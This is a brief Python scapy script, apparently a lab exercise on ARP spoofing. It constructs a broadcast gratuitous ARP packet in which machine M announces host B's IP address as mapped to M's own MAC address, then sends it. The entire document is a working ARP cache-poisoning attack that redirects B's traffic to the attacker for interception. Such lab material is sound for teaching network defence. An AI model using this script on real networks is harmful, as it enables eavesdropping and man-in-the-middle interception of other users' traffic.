#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import Ether, ARP

A_IP='10.0.2.15'
A_MAC='08:00:27:e9:cd:6b'
B_IP='10.0.2.4'
B_MAC='08:00:27:af:c0:73'
M_IP='10.0.2.5'
M_MAC='08:00:27:de:41:03'

#Construct ARP gratuitous packet
E = Ether(dst='ff:ff:ff:ff:ff:ff', src=M_MAC)
A = ARP(hwsrc=M_MAC,psrc=B_IP,hwdst='ff:ff:ff:ff:ff:ff',pdst=B_IP)

p = E/A
p.show()
sendp(p)